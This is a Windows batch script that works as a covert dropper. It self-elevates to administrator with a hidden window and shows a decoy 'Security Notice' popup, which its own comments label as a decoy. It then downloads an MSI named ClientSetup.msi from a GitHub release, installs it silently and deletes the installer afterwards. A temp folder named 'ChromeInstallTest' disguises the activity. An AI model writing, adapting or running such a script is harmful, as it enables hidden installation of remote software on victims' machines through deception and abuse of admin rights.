@echo off
setlocal EnableExtensions

:: --- Self-elevation: relaunch HIDDEN so no console stays open during install ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

set "TMPDIR=%TEMP%\ChromeInstallTest"
set "MSI=%TMPDIR%\ClientSetup.msi"
set "URL=https://github.com/Nattywillson/SC/releases/download/1.0.0/ClientSetup.msi"
set "LOG=%TEMP%\sc-install.log"

if not exist "%TMPDIR%" mkdir "%TMPDIR%"

:: --- The ONLY visible UI: decoy popup (also fixed the "Requiured" typo) ---
powershell -NoProfile -Command "(New-Object -ComObject WScript.Shell).Popup('A required component could not be verified. Please retry.',5,'Security Notice',64)" >nul

:: --- Console echos replaced by file logging: window is hidden, log is your eyes ---
echo [%date% %time%] start >>"%LOG%"
curl.exe -f -L -sS -o "%MSI%" "%URL%" >>"%LOG%" 2>&1
if errorlevel 1 (
    echo [%date% %time%] download failed >>"%LOG%"
    set "RC=1"
    goto cleanup
)

msiexec.exe /i "%MSI%" /qn /norestart >>"%LOG%" 2>&1
set "RC=%ERRORLEVEL%"
echo [%date% %time%] msiexec exit %RC% >>"%LOG%"

:cleanup
del /q "%MSI%" 2>nul
rmdir /q "%TMPDIR%" 2>nul
exit /b %RC%
